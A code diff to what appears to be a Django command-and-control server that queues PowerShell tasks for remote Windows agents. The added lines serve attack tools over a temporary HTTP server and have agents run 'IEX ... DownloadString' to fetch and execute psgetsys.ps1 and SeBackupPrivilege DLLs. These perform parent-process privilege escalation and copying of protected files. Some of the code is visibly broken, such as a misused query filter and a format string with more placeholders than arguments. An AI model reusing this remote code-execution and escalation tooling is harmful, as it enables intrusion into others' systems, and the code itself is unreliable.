@@ -2,10 +2,13 @@ import os
 from blog.views import *
 from blog.models import *
 from django.http import HttpResponse , JsonResponse
+from blog import forms
+import netifaces
 
 # from rest_framework.views import APIView
 
 current_path= os.path.dirname(os.path.abspath(__file__))
+tools_path = os.path.normpath(current_path+os.sep+os.pardir)+"/Tools&Scripts"
 
 #we need to send request from GUI user with agent(hidden parm) and path(opt)
 def DirectoryListing(request):
@@ -386,7 +389,7 @@ def processes(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Running_processes===============";tasklist /svc;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Running_processes===============";tasklist ;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -627,12 +630,13 @@ def Exec_With_Prnt_Priv(request):
         agentId = request.POST['agentId']
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
-        agentTask.save()
-        psgetsysURL=request.POST['psgetsysURL']  #the PoCScript "psgetsys.ps1"
+        agentTask.save() 
         system_pid = request.POST['system_pid']    
         path_to_execute = request.POST['path_to_execute']
-        task = "import-module {} ;[MyProcess]::CreateProcessFromParent({},'{}','')".format(psgetsysURL,system_pid,path_to_execute)
-      #  task = "IEX(New-Object Net.WebClient).DownloadString('{}');[MyProcess]::CreateProcessFromParent({},'{}','')".format(psgetsysURL,system_pid,path_to_execute)
+        listenerdata = ListenerForm.objects.filter("-created_date").values()[0]
+        ip = listenerdata['ip']
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
+        task = "IEX (New-Object Net.WebClient).DownloadString('http://{}:8888/psgetsys.ps1');[MyProcess]::CreateProcessFromParent({},'{}','')".format(ip,system_pid,path_to_execute)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -652,7 +656,6 @@ def Import_Module (request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         Module_Path = request.POST['module_Path']
-        
         task = "Import-Module .\{}".format(Module_Path)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -752,12 +755,13 @@ def SeBackUpPrivelege (request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-
-        utilDLL_PATH = request.POST['utilDLL_PATH']
-        CmdLets_PATH = request.POST['CmdLets_PATH']        
+        # utilDLL_PATH = request.POST['utilDLL_PATH']
+        # CmdLets_PATH = request.POST['CmdLets_PATH']        
         FileToCopy = request.POST['FileToCopy']
         outPut = request.POST['outPut']
-        task = "Import-Module .\{utilDLL_PATH};Import-Module .\{CmdLets_PATH};Set-SeBackupPrivilege;Copy-FileSeBackupPrivilege '{FileToCopy}' .\{outPut}".format(utilDLL_PATH,CmdLets_PATH,FileToCopy,outPut)
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
+        #dll download
+        task = "IEX (New-Object Net.WebClient).DownloadString('http://{}:8888/SeBackupPrivilegeCmdLets.dll');IEX (New-Object Net.WebClient).DownloadString('http://{}:8888/SeBackupPrivilegeUtils.dll');Set-SeBackupPrivilege;Copy-FileSeBackupPrivilege '{}' .\{}".format(FileToCopy,outPut)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -767,3 +771,4 @@ def SeBackUpPrivelege (request):
         return render(request, 'blog/listeners.html')
 
 
+#dll, ps1, exe
